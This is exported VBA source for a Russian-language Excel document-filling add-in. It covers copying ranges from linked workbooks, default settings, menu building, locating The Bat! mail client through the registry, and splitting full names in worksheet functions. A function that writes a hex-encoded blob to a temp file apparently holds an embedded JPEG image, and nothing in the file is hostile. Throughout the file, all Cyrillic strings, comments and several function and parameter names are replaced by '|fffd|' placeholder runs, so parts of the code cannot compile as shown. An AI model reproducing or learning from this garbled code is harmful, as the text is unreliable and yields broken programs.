    arr(3, 0) = "Picture": arr(3, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    InsertTableStylesArray = arr
End Function

Function CopyExcelTable(ByVal Link$, Optional ByRef msg$, Optional ByRef InsertMode$) As Boolean
    On Error Resume Next
    Dim ra As Range, sh As Worksheet, WB As Workbook, filename$, shortFilename$, SheetName$, RangeAddress$
    If Link$ Like LINK_HEADER_TABLE$ & "*/*/*" Then
        Link$ = Split(Link$, LINK_HEADER_TABLE$)(1)
        filename$ = Split(Link$, "/")(0)
        If filename$ = "" Then
            filename$ = ActiveWorkbook.FullName
        Else
            If (Not filename$ Like "[A-Z]:\*") And (Not filename$ Like "\\*") Then
                filename$ = TABLES_FOLDER$ & filename$
            End If
        End If
        shortFilename$ = Dir(filename$, vbNormal)
        If Len(shortFilename$) Then
            Err.Clear: Set WB = Workbooks(CStr(shortFilename$))
            If WB Is Nothing Then
                Application.DisplayAlerts = False
                ExcelTablesToBeClosed.Add shortFilename$, shortFilename$
                Set WB = Workbooks.Open(filename$, , True)
                Application.DisplayAlerts = True
            End If
            'If Err Then Debug.Print Err.Number, Err.Description, filename$
            If WB Is Nothing Then msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd|": Exit Function

            SheetName$ = Split(Link$, "/")(1)
            Set sh = WB.Worksheets(CStr(SheetName$))
            If sh Is Nothing Then msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & SheetName$ & "|fffd|": Exit Function

            RangeAddress$ = Split(Link$, "/")(2)
            If RangeAddress$ = "UsedRange" Then
                Set ra = sh.UsedRange
            Else
                Set ra = sh.Range(RangeAddress$)
            End If
            If sh Is Nothing Then msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: |fffd|" & RangeAddress$ & "|fffd|": Exit Function

            InsertMode$ = Split(Link$, "/")(3)

            ra.Copy
            CopyExcelTable = True
        Else
            msg$ = "|fffd||fffd||fffd||fffd| |fffd|" & filename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
    End If
End Function


Sub AddImagesFilenamesValidationList_IntoSelectedRange()
    On Error Resume Next
    Dim coll As Collection, item, filename$, list$, ra As Range
    Set coll = FWF.FilenamesCollection(IMAGES_FOLDER$, , 1)

    For Each item In coll
        filename$ = Dir(item, vbNormal)
        If Len(list$) + Len(filename$) < 250 Then list$ = list$ & "," & filename$
    Next

    Set ra = Intersect(Selection, ActiveSheet.UsedRange)
    With ra.Validation
        .Delete
        .Add xlValidateList, , xlBetween, Mid(list$, 2)
    End With
End Sub
Attribute VB_Name = "mod_Main"
'---------------------------------------------------------------------------------------
' Module        : mod_Main
' Author        : EducatedFool                     Date: 06.06.2014
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Sub SaveDefaultSettings()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    SETT.LoadAllSettings

    SETT.AddDefaultValue "CheckBox_TemplatesForm_SortByName", True
    SETT.AddDefaultValue "MultiPage_Mode", 0        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    SETT.AddDefaultValue "CheckBox_ReplaceExistingFieldCodesOnly", False

    SETT.AddDefaultValue "TextBox_CombineXLS_filename", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.xls", , True
    SETT.AddDefaultValue "TextBox_SendInterval_Min", 0
    SETT.AddDefaultValue "TextBox_SendInterval_Max", 0
    SETT.AddDefaultValue "TextBox_HyperlinkText", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", , True

    SETT.AddDefaultValue "ComboBox_FirstRow", 1
    SETT.AddDefaultValue "ComboBox_BaseColumn", 2, True
    SETT.AddDefaultValue "ComboBox_TemplatesFilter_Column", 5, True
    SETT.AddDefaultValue "ComboBox_LineFeed", Chr(11), , True
    SETT.AddDefaultValue "TextBox_OutputMask", "{%str%} - {%filename%}.{%ext%}", , True

    SETT.AddDefaultValue "ComboBox_FirstColumn", 1, True
    SETT.AddDefaultValue "ComboBox_BaseRow", 2
    SETT.AddDefaultValue "CheckBox_UseAllColumns", True

    SETT.AddDefaultValue "TextBox_AttachCreatedFilesMask", "*", , True
    SETT.AddDefaultValue "TextBox_AttachStaticFilesMask", "*", , True

    SETT.AddDefaultValue "TextBox_TemplatesFolder", ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\", , True
    SETT.AddDefaultValue "TextBox_OutputFolder", ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\", , True
    SETT.AddDefaultValue "TextBox_TablesFolder", ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\", , True

    SETT.AddDefaultValue "CheckBox_ShowFolderWhenDone", True
    SETT.AddDefaultValue "CheckBox_TemplatesFilter_Enabled", False
    SETT.AddDefaultValue "ComboBox_SendMark_Column", 10, True
    SETT.AddDefaultValue "ComboBox_Multirow_GroupColumn", 1, True
End Sub

Sub CreateProgramCommandBar()
    On Error Resume Next
    SaveDefaultSettings

    Dim AddinMenu, ExtendedMenu
    Application.ScreenUpdating = False
    Set AddinMenu = GetCommandBar(PROJECT_NAME, True)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    Add_Control AddinMenu, ct_BUTTON, 593, "CreateAllDocuments", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True        ' 248

    If SETT.GetBoolean("CheckBox_ShowAdditionalMenu") Then
        Set ExtendedMenu = Add_Control(AddinMenu, ct_POPUP, 0, "", "  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        Add_Control ExtendedMenu, ct_BUTTON, 385, "UpdateUDFs", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True        ' 202
        Add_Control ExtendedMenu, ct_BUTTON, 142, "CtrlShiftT", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|... (Ctrl + Shift + T)", msoButtonIconAndCaption, True
        Add_Control ExtendedMenu, ct_BUTTON, 218, "CtrlShiftI", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|... (Ctrl + Shift + I)", msoButtonIconAndCaption, False        ' 508
        Add_Control ExtendedMenu, ct_BUTTON, 0, "AddImagesFilenamesValidationList_IntoSelectedRange", _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, False        ' 508
        Add_Control ExtendedMenu, ct_BUTTON, 0, "AddAbsentFieldCodes", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", msoButtonIconAndCaption, True
    End If

    Add_Control AddinMenu, ct_BUTTON, 548, "ShowSettingsPage", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", msoButtonIconAndCaption, True

    If Len(Trim(UpdatesInfo_$)) Then
        Dim arr, subMenu, i&, Caption$, descr$, v, subMenu_Updates, bf&
        arr = Split(UpdatesInfo_$, "&&")
        Set subMenu = Add_Control(AddinMenu, ct_POPUP, 0, "", " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", , True)
        Add_Control subMenu, ct_BUTTON, 1759, "ManualInstallUpdate", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True        ' 1759

        For i = LBound(arr) To UBound(arr)
            Caption$ = Split(arr(i), "==")(0)
            descr$ = Split(arr(i), "==", 2)(1)
            Set subMenu_Updates = Add_Control(subMenu, ct_POPUP, 4356, "", Caption$, , i = LBound(arr))
            For Each v In Split(descr$, vbLf)
                bf& = 0        '534
                If Trim(v) Like "+*" Then bf& = 535: v = Split(Trim(v), , 2)(1)
                If Trim(v) Like "-*" Then bf& = 536: v = Split(Trim(v), , 2)(1)
                If Len(Trim(v)) Then Add_Control subMenu_Updates, ct_BUTTON, bf&, "", v, msoButtonIconAndCaption, False, 1        ' 231
            Next v
        Next i
    End If

    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIcon, True
    Set ThisWorkbook.app = Application
    Application.ScreenUpdating = True
End Sub

Sub ExitProgram()
    On Error Resume Next
    Dim msg$: msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?   "
    If MsgBox(msg, vbQuestion + vbDefaultButton2 + vbOKCancel, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Sub
    DeleteProgramCommandBar
    ThisWorkbook.Close False
End Sub

Function GetFile_MainPicture() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next:
    Dim F_TXT$, buf$, tmp_file$, i&, res$, ff&: Const BufLen& = 5000

    F_TXT$ = F_TXT$ & "EDB6E7DB5BB96CA2BF6AD49352A71714CA95C14DADA713EF2168500A4A8641C11D8823A10740957A641AA4528A30A83C8EBC5119A5AE3FE8A5613FB13A9AAAF7F567C20EE755EE216FCC5D06EB88E34F53494F13554A14A8EEA42547A38414AB1D7AA8F5200D6886C98C020EA191E2777B6E4977FA6C0B1EB8EDBED52228A85C75A88DA5C758E63D8464641C2943D671D4829EA0056883C226F45D5B833EEFB5AE99AC57DFB70455355E8EC0655212F254783A84FA4389E1DD27AE7E9932B57E6CFDBFB3DF4CF52EAB79572519D5420725CBA83E7D0C803B8493C703A745918CEAE4F0CFB3436576BE152E514BD70CE51A856657425D94E60A867E2940C207E5CFC4EA36C5799D7A9F513909029D27A5079536CFE391AC11CC3CAEA34514996857CC564FA1C085D6F5C4776537C287B8D01EFBBEDDBB7CBB7AE57529050C48C7F473540F4CA4FA0A8F40918EEAD1CEE2DFD44DA8A741A95420546E59B2E4A6031163321D7E44929529011C8A50080859383D00FA68DF75F6F20EEC6DCDC1695470235522A990E1192D39DDB707D52B0950FCBA866BD7EDC53A2EDCDD1715424BD26DD151B72753D653C6257633652952940057379B0559513D720633AAA9EB32E52963603C2BA79626CE4CB27E22DFB865DCBE263712B0CADC8B1ADFB069DFDC"
    F_TXT$ = F_TXT$ & "94B352983F5CB6D27FEF4978551B937277426D46E5B8AA574C1B4E2B5528D1A5A1086DC92EE436F36CB684278200CE403EA03AE0EA8B776EE914C91C9EA0B956ABCF67CD764A5030CAD5D17C14E2B8B585F2F4A3A8C763AC7797856A7F888AD53EF1B96AEFDBD528713EEC9EDD2DFE42506CABD4B2A09E190A27033E950F97584956DBB5C513A55C6B1BAD253D2848012FB2FB38C64F382F98ACAB996FA444B5D1C87C8254A2E4B70DA1FCD44BD47A1DE9B9F7E1AFDB11A6B9FC3CFA9EA64D654CA5B5CF694DA94A3E6AD21C42393692067A2BEBAE8CECCEE635BB160C2AE18C69F514AD70EA54F5FBD0E63478BCD1FC14323E69524FC74ACA2DA966DA56052A9F46A84A71BA3151FB05216A506D414A121398C9E473ED082B249F4924EBCCDA0AAC7B0FC4655683104D6A877953CCF613350F026A11B01C29F33AFAD85249CF7F246AAAD76C976A9029E4A89480031660DB231F51C9C9CEA272B2B155ABEE2D201CE72E7ECF9E34303DC53DA86BC4BD9A2DFDDFB9E8EDE59837E52D35CA6908E41AACC0C1250803A9520214AC64AB2411AB9749FF00125B2351DE3A1505DA05523516E7A054533E04B96D95B441494B8DAC0EA12A041E80FBA07C73A710BE046C3BBFF9A9B7146AD427DDA63D2584BEF06D2952DA7127CB90D7AC10087123B8"
    F_TXT$ = F_TXT$ & "CE4A8FC74516952E814BABCA3582C496DD693210BAABE1D2975278A94942C9EA52A4754A46388F98D26697B45BB3B26E552834482EEE1FDFAA1514D618718A7330A5385425A1495ACF14A92968A4A41C92A38CF4D1150BC33EE55CB2FEDB73DE54FB590B6D2DAA25BF1CCB91C3912417DE012951CE094B67B0C76D0DD9F2F70183454F83B043FB86556378AD5B6555A7532D4F450E216BCA030CB4AF2D208E6B23A10127DDF89EF9D25769ABCEEFCEEFDA72EDB8A98F6ED96E2E649ACF985E52F932E30D454B984A54A5A5654BC27A0477C919725B5E11B6D6852D33AA3497AEFAA0214675CF2153D448EC7CB57B24FF008A0761F21A704488C408CDC78ACB71A3B69E2869A404A103E400E8068980A3FFD9"
    For i = 1 To Len(F_TXT$) / 2
        buf$ = buf$ & Chr(Val("&H" & Mid(F_TXT$, 2 * i - 1, 2)))
        If Len(buf$) > BufLen& Then res$ = res$ & buf$: buf$ = "": DoEvents
    Next: res$ = res$ & buf$
    tmp_file$ = Environ("tmp") & "\file_MainPicture_" & PROJECT_NAME$: Kill tmp_file$
    ff& = FreeFile: Open tmp_file$ For Binary Access Write As #ff
    Put #ff, , res$
    Close #ff
    If FileLen(tmp_file$) = Len(F_TXT$) / 2 Then GetFile_MainPicture = tmp_file$ Else Debug.Print FileLen(tmp_file$), Len(F_TXT$) / 2
End Function




Attribute VB_Name = "mod_SendMail"
'---------------------------------------------------------------------------------------
' Module        : mod_SendMail
' Author        : EducatedFool                     Date: 20.11.2012
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module

Function SEND_MAIL_MODE() As Boolean
    On Error Resume Next: en& = Err.Number
    SEND_MAIL_MODE = CBool(SETT.GetText("CheckBox_SendEmail", False))
    If en& = 0 Then Err.Clear
End Function

Function TheBAT_PATH() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| TheBAT! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    key$ = "HKEY_CURRENT_USER\Software\RIT\The Bat!\EXE path"
    TheBAT_PATH = CreateObject("WScript.Shell").RegRead(key$)

    If SETT.GetText("TextBox_TheBAT_Path") = "" Then
        SETT.SetText "TextBox_TheBAT_Path", TheBAT_PATH
    End If
    TheBAT_PATH = SETT.GetText("TextBox_TheBAT_Path")
    If Dir(TheBAT_PATH, vbNormal) = "" Then TheBAT_PATH = ""
End Function

Attribute VB_Name = "mod_SheetFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_SheetFunctions
' Author        : EducatedFool                     Date: 07.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Sub UpdateUDFs()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then Exit Sub

    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    Application.ScreenUpdating = False
    Dim sh As Worksheet, ra As Range, cell As Range, ErrorsCount&, coll As New Collection
    For Each sh In ActiveWorkbook.Worksheets
        Set ra = Nothing: Set ra = FindAll(sh.UsedRange, "\FillDocuments", xlFormulas, xlPart)        '& ThisWorkbook.Name & "'!", xlFormulas, xlPart)
        If Not ra Is Nothing Then
            Set coll = New Collection
            For Each cell In ra.Cells
                ErrorsCount& = ErrorsCount& + 1
                oldPath$ = GetOldAddinPathForReplace(cell.Formula)
                If Len(oldPath$) Then coll.Add oldPath$, oldPath$
            Next cell
            For Each item In coll
                sh.UsedRange.Replace item, "'" & ThisWorkbook.Name & "'", xlPart
            Next
        End If
    Next sh
    Application.Calculation = calc
    If ErrorsCount& Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ErrorsCount&, vbInformation
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FillDocuments", vbInformation
    End If
End Sub

Private Function GetOldAddinPathForReplace(ByVal txt As String) As String
    On Error Resume Next
    stext$ = "\FillDocuments"        '"\" & ThisWorkbook.Name & "'!"
    pos& = InStr(1, txt, stext, vbTextCompare)
    If pos& = 0 Then Exit Function

    pos1& = InStrRev(txt, "'", pos, vbTextCompare)
    If pos1& = 0 Then Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    pos2& = InStr(pos&, txt, "'", vbTextCompare)
    If pos2& = 0 Then Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    GetOldAddinPathForReplace = Mid(txt, pos1, pos2 - pos1 + 1)
End Function

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$)(0)
End Function
Function |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$)(1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$, , 3)(2)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|.|fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|."
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = CropFIO(|fffd||fffd||fffd|)
End Function
